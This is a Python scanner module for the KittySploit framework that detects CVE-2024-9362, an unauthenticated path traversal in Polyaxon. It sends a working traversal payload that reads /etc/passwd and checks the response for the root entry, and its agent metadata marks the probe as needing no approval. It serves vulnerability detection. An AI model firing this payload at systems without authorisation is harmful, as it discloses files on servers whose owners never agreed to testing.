#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Polyaxon latest version contains a path traversal caused by insufficient validation in directory access, letti."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Polyaxon - Unauthenticated Directory Traversal Detection',
        'description': 'Polyaxon latest version contains a path traversal caused by insufficient validation in directory access, letting unauthenticated attackers retrieve directory information and file contents, exploit requires no authentication.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'polyaxon', 'lfi', 'traversal', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/polyaxon/polyaxon',
            'https://huntr.com/bounties/d8dcb40f-ce76-4524-8d06-e0f12a07809d',
        ],
        'cve': 'CVE-2024-9362',
    }

    def run(self):
        r = self.http_request(method="GET", path='/streams/v1/polyaxon/default/s/runs/%2e%2e/artifact?stream=true&path=../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Polyaxon - Unauthenticated Directory Traversal detected",
                path='/streams/v1/polyaxon/default/s/runs/%2e%2e/artifact?stream=true&path=../../../../etc/passwd',
            )
            return True
        return False

